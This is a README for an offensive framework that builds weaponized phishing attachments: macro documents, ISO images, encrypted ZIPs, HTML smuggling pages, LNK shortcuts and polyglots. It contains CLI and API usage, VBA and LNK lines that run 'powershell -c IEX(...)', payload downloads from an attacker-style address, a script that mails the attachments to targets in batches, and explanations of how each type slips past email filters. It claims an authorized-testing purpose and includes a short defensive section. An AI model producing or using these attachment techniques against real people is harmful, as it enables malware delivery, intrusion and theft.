# Attachment Weaponizer

Modular framework for creating weaponized attachments for authorized phishing campaigns and security testing.

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed exclusively for:
- Authorized penetration testing with written permission
- Security awareness training programs
- Red team engagements with proper authorization
- Educational purposes in controlled environments

Unauthorized use is illegal under computer fraud laws including the CFAA. Users are responsible for compliance with all applicable laws.

## Features

- **7 Attachment Types**: Office macros, ISO files, password-protected ZIPs, HTML smuggling, LNK files, polyglots
- **Modular Design**: Easy to extend with new attachment types
- **CLI & API**: Both command-line and programmatic interfaces
- **Educational Focus**: Detailed explanations of techniques
- **Integration Ready**: Works with phishing frameworks

## Installation

```bash
# Clone repository
git clone https://github.com/yourusername/attachment-weaponizer
cd attachment-weaponizer

# Install (no required dependencies for basic features)
pip install -r requirements.txt  # Optional enhancements
```

## Quick Start

### CLI Usage

```bash
# Create macro Word document
python -m attachment_weaponizer macro-doc payload.vba

# Create password-protected ZIP
python -m attachment_weaponizer password-zip payload.exe

# Create HTML smuggling file
python -m attachment_weaponizer html-smuggling http://10.10.14.5/payload.exe

# List created attachments
python -m attachment_weaponizer list

# Show examples
python -m attachment_weaponizer examples
```

### Python API

```python
from attachment_weaponizer import AttachmentWeaponizer

# Initialize
weaponizer = AttachmentWeaponizer(output_dir='attachments')

# Create attachments
doc = weaponizer.create_macro_doc('payload.vba', 'invoice.docm')
zip_file = weaponizer.create_password_zip('payload.exe', password='2024')
html = weaponizer.create_html_smuggling('http://10.10.14.5/payload.exe')

# Get delivery instructions
print(doc.get_delivery_instructions())

# List all created
weaponizer.print_summary()
```

## File Structure

```
attachment_weaponizer/
├── core/                  # Core logic
│   ├── weaponizer.py      # Main orchestrator
│   └── attachment.py      # Data model
├── creators/              # Attachment creators
│   ├── office_creator.py      # Office documents
│   ├── archive_creator.py     # ZIP, ISO
│   ├── html_creator.py        # HTML smuggling
│   ├── lnk_creator.py         # Windows shortcuts
│   └── polyglot_creator.py    # Polyglot files
├── utils/                 # Utilities
│   ├── encoders.py        # Encoding functions
│   └── helpers.py         # Helper functions
└── config/                # Configuration
    └── settings.py        # All settings
```

## Attachment Types

### 1. Macro Documents (Word/Excel)

Create Office documents with embedded VBA macros:

```bash
python -m attachment_weaponizer macro-doc payload.vba --output invoice.docm
```

**How it works:**
- VBA macros execute on document open (with user permission)
- Auto_Open() or Document_Open() functions trigger execution
- Can download and execute additional payloads
- Requires manual macro insertion via VBA editor

**Example VBA:**
```vba
Sub Auto_Open()
    Shell "powershell -c IEX(...)", vbHide
End Sub
```

### 2. ISO Files

Create ISO disk images containing payloads:

```bash
python -m attachment_weaponizer iso payload.exe --output software.iso
```

**Why ISO files work:**
- Often bypass email security filters
- Users trust disk image formats
- Can contain multiple files
- Hide true file extensions

**Requires:** `mkisofs` or similar tool

### 3. Password-Protected ZIPs

Create encrypted ZIP archives:

```bash
python -m attachment_weaponizer password-zip payload.exe --password 2024
```

**Why this works:**
- Email security cannot scan encrypted content
- Password in email body seems legitimate
- Users expect protected documents
- Bypasses attachment filters

**Best with:** `pyminizip` or `pyzipper` for AES encryption

### 4. HTML Smuggling

Embed payload in HTML file downloaded via JavaScript:

```bash
python -m attachment_weaponizer html-smuggling http://10.10.14.5/payload.exe
```

**How it works:**
- Payload base64-encoded in HTML
- JavaScript decodes and "downloads" via Blob API
- Never touches network (if embedded)
- Bypasses email attachment filters completely

**Example:**
```javascript
var payload = "BASE64_ENCODED_PAYLOAD";
var binary = atob(payload);
var blob = new Blob([bytes]);
// Create download link
```

### 5. LNK Files

Create Windows shortcut files that execute commands:

```bash
python -m attachment_weaponizer lnk "powershell -c IEX(...)"
```

**Why LNK files work:**
- Trusted file type (Windows shortcuts)
- Can execute arbitrary PowerShell/CMD
- Icon can hide true purpose
- Often bypass filters

**Common patterns:**
- PowerShell download and execute
- Certutil for file download
- MSHTA for HTA execution
- Rundll32 for DLL loading

### 6. Polyglot Files

Files valid as multiple formats (e.g., PDF and EXE):

```bash
python -m attachment_weaponizer polyglot payload.exe --output document.pdf
```

**How polyglots work:**
- Different parsers read files differently
- PDF ignores data after %%EOF
- PE executable looks for MZ header
- Craft file valid for both formats

**Advanced technique** - requires deep file format knowledge

## Integration Examples

### With Phishing Framework

```python
from attachment_weaponizer import AttachmentWeaponizer
from phishing_framework import PhishingFramework

# Create weaponized attachment
weaponizer = AttachmentWeaponizer()
html = weaponizer.create_html_smuggling(
    'http://10.10.14.5/payload.exe',
    'quarterly_report.html'
)

# Attach to phishing email
phishing = PhishingFramework()
phishing.send_email(
    to='target@example.com',
    subject='Q4 Financial Report',
    body='Please review the attached report',
    attachment=html.output_path
)
```

### Batch Creation

```python
from attachment_weaponizer import AttachmentWeaponizer

weaponizer = AttachmentWeaponizer()

# Create multiple attachment types
attachments = [
    weaponizer.create_macro_doc('payload.vba', 'invoice.docm'),
    weaponizer.create_password_zip('payload.exe', password='2024'),
    weaponizer.create_html_smuggling('http://server.com/payload.exe'),
]

# Use different attachments for different targets
for target, attachment in zip(targets, attachments):
    send_phishing_email(target, attachment)
```

## Configuration

Edit `config/settings.py` to customize:

```python
class Settings:
    # Output directory
    DEFAULT_OUTPUT_DIR = "weaponized_attachments"
    
    # ZIP password length
    DEFAULT_ZIP_PASSWORD_LENGTH = 8
    
    # File size limits
    MAX_ATTACHMENT_SIZE = 25 * 1024 * 1024  # 25 MB
    
    # Safety
    REQUIRE_CONFIRMATION = True
    LOG_CREATION = True
```

## Detection and Defense

### How Defenders Detect These Attachments

**Macro Documents:**
- Scan VBA code for suspicious functions (Shell, CreateObject)
- Check for Auto_Open/Document_Open macros
- Analyze macro obfuscation
- Sandbox execution

**ISO Files:**
- Extract and scan contents
- Check for executable files
- Analyze autorun configurations

**Password-Protected ZIPs:**
- Flag encrypted archives
- Require password separately
- Scan after extraction

**HTML Smuggling:**
- Analyze JavaScript for Blob/atob usage
- Check for base64 payloads
- Sandbox HTML execution

**LNK Files:**
- Parse LNK target and arguments
- Flag suspicious PowerShell/CMD usage
- Check for network paths

### Defensive Recommendations

1. **Email Security:**
   - Block executable attachments
   - Scan archives (including encrypted)
   - Sandbox attachments before delivery
   - Use attachment reputation services

2. **Endpoint Protection:**
   - Disable macros by default
   - Application whitelisting
   - PowerShell logging and restrictions
   - Behavioral analysis

3. **User Training:**
   - Never enable macros from untrusted sources
   - Verify sender before opening attachments
   - Be suspicious of password-protected files
   - Report suspicious emails

   ## Testing Your Defenses

   Use this tool to test your organization's defenses:

```bash
# Create test attachments
python -m attachment_weaponizer macro-doc test_macro.vba
python -m attachment_weaponizer password-zip harmless_test.txt
python -m attachment_weaponizer html-smuggling http://testsite.com/test.txt

# Send to test account
# Monitor: Did email security block it?
# Did endpoint protection catch it?
# Did user report it?
```

## Advanced Usage

### Custom VBA Generation

```python
from attachment_weaponizer.creators import OfficeCreator

creator = OfficeCreator('output')

# Generate sample VBA
vba_code = creator.generate_sample_vba(
    payload_url='http://10.10.14.5/payload.exe'
)

# Save and use
with open('payload.vba', 'w') as f:
    f.write(vba_code)
```

### Custom HTML Smuggling with Embedded Payload

```python
from attachment_weaponizer.creators import HTMLCreator

creator = HTMLCreator('output')

# Read payload
with open('payload.exe', 'rb') as f:
    payload_bytes = f.read()

# Create HTML with embedded payload
html = creator.create_smuggling_html(
    payload_url='',  # Not used when embedding
    output_name='document.html',
    payload_bytes=payload_bytes
)
```

### LNK Command Examples

```python
from attachment_weaponizer.creators import LNKCreator

creator = LNKCreator('output')

# Get example commands
examples = creator.generate_example_commands()

for name, command in examples.items():
    print(f"{name}:")
    print(f"  {command}\n")
```

## Troubleshooting

### Macro Documents Not Working
- Ensure macros are enabled in Word/Excel
- Check macro code for syntax errors
- Verify Auto_Open() function name
- Test in sandbox environment first

### ZIP Encryption Not Working
- Install pyminizip: `pip install pyminizip`
- Or use 7zip: `7z a -p{password} -mem=AES256 output.zip file`
- Python's zipfile doesn't support AES natively

### ISO Creation Failing
- Install mkisofs: `apt-get install genisoimage` (Linux)
- Or use ImgBurn (Windows)
- Or use pycdlib library (Python)

### LNK Files Not Executing
- Test on Windows system
- Check command syntax
- Verify paths and permissions
- Check antivirus blocking

## API Reference

### AttachmentWeaponizer

Main class for creating weaponized attachments.

**Methods:**
- `create_macro_doc(macro_code_path, output_name)` - Create macro Word document
- `create_macro_excel(macro_code_path, output_name)` - Create macro Excel document
- `create_iso(payload_path, output_name)` - Create ISO file
- `create_password_zip(file_path, password, output_name)` - Create encrypted ZIP
- `create_html_smuggling(payload_url, output_name)` - Create HTML smuggling file
- `create_lnk(command, output_name)` - Create malicious LNK
- `create_polyglot(payload_path, output_name)` - Create polyglot file
- `list_created()` - Get list of created attachments
- `print_summary()` - Print summary of all attachments

### Attachment

Data model for attachments.

**Attributes:**
- `name` - Filename
- `attachment_type` - Type enum
- `output_path` - Full path to file
- `payload` - Payload path/URL
- `password` - Password (if applicable)

**Methods:**
- `get_summary()` - Get attachment summary dict
- `get_delivery_instructions()` - Get delivery instructions string

## Contributing

Contributions welcome! Focus areas:
- Additional attachment types
- Better Office document generation
- Improved polyglot techniques
- Detection evasion methods
- Integration with more frameworks

## Security Notes

- All techniques have legitimate defensive testing uses
- Attachments should be tested in isolated environments
- Never use against unauthorized targets
- Follow responsible disclosure practices
- Understand detection signatures

## Resources

### Further Reading
- MITRE ATT&CK: T1566 (Phishing)
- MITRE ATT&CK: T1204 (User Execution)
- OWASP: Phishing Awareness
- SANS: Phishing Defense

### Tools
- VirusTotal: Test detection rates
- Hybrid Analysis: Behavioral analysis
- Any.run: Interactive sandbox
- Joe Sandbox: Advanced analysis

## License

MIT License - For authorized security testing only.

---

## Quick Reference

```bash
# Common commands
python -m attachment_weaponizer macro-doc payload.vba
python -m attachment_weaponizer password-zip payload.exe --password 2024
python -m attachment_weaponizer html-smuggling http://server.com/payload.exe
python -m attachment_weaponizer lnk "powershell -c IEX(...)"
python -m attachment_weaponizer list
python -m attachment_weaponizer examples
```

---

**⚠️ Final Warning**: This tool creates actual malicious files. Use only with proper authorization. Unauthorized use is illegal and unethical.